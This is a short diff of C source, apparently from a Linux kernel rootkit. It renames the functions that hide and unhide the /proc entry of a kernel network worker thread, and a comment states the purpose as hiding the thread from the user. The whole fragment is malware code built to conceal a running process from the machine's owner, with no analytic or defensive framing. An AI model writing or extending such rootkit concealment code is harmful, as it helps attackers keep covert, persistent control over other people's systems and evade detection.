@@ -1,4 +1,4 @@
-#include "hide.h"
+#include "hide_api.h"
 #include "network.h"
 
 static bool is_auth = false;
@@ -123,7 +123,7 @@ int start_network_worker(void) {
     // Hide the thread from the user
     char path[32] = { 0 };
     snprintf(path, sizeof(path), "/proc/%d", network_worker_thread->pid);
-    add_hidden_dir(path);
+    hide_file(path);
 
     return SUCCESS;
 }
@@ -136,7 +136,7 @@ int stop_network_worker(void) {
     // Remove the hidden directory associated with the thread
     char path[32] = { 0 };
     snprintf(path, sizeof(path), "/proc/%d", network_worker_thread->pid);
-    remove_hidden_dir(path);
+    unhide_file(path);
 
     // Stop the network worker thread
     kthread_stop(network_worker_thread);
